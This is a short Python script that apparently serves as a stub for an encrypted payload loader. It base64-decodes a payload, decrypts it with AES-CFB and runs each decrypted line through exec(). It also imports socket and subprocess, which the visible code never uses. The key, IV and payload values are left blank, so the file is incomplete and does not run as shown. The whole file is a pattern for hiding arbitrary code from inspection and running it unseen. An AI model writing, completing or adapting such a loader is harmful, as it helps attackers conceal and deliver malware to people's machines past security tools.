#!/usr/bin/python
# -*- coding: utf-8 -*-

import socket,subprocess,os
import re,random,string,Crypto,binascii,base64
from Crypto.Cipher import AES
from binascii import hexlify, unhexlify
from base64 import b64decode, b64encode


def ddc(pld,key,iv):
    obj3 = AES.new(key,AES.MODE_CFB,iv)
    cd = obj3.decrypt(pld)

    return cd
def exddc(pld,key,iv):
    cP = pld
    out = b64decode(cP)
    x = ddc(out,key,iv)
    lines = x.splitlines()
    return lines
key=
iv=
pld=

def main(xc=pld):
    cd=xc
    lines = exddc(cd,key,iv)

    for l in lines:
        arr = re.findall('..?',l)
        cmd = "".join(arr)
        exec(cmd)
    return
main()